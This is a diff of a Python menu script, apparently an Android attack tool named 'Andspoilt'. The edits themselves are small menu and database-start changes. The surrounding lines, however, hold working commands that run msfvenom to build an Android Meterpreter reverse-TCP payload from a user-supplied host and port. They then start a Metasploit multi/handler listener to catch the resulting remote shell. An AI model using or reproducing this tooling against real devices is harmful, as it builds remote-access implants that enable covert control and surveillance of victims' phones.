@@ -3,12 +3,8 @@
 import os
 import sys, traceback
 import subprocess
+#import argparse
 from src import banner
-"""
-The last version was a complete bug tavern
-Patches fixed and features added
-Beta version
-"""
 
 def main():
 	try:
@@ -44,7 +40,7 @@ Use "back" to navigate to previous commands
 						os.system('msfvenom -p android/meterpreter/reverse_tcp LHOST="' + lhost + '" LPORT="' + lport + '" -o /root/Desktop/' + name)
 						listen = raw_input("\033[1;32mDo you wish to start the listener now?(y/n) > \033[1;m")
 						if listen == 'yes' or listen =='y':
-							os.system("service postgresql start && msfdb init")
+							os.system("service postgresql start && msfdb start")
 							os.system("msfconsole  -q -x 'use exploit/multi/handler/; set payload android/meterpreter/reverse_tcp; set LPORT " + lport + "; set LHOST " + lhost + "; run -j'")
 						else:
 							os.system("clear")
@@ -141,14 +137,14 @@ Use "back" to navigate to previous commands
 						banner.about()
 					if dark == "5":
 						banner.help()
-					if dark == "6":
+					if dark == "6" or dark == 'exit':
 						print("Exit Andspoilt")
 						sys.exit(0)
-					if dark == "show w":
+					if dark == "show w" or dark == 'warranty':
 						banner.warranty()
-					if dark == "show c":
+					if dark == "show c" or dark == 'copyright':
 						banner.copyright()
-					if dark == "banner":
+					if dark == "banner" or dark == 'b':
 						os.system("clear")
 						banner.banner()
 
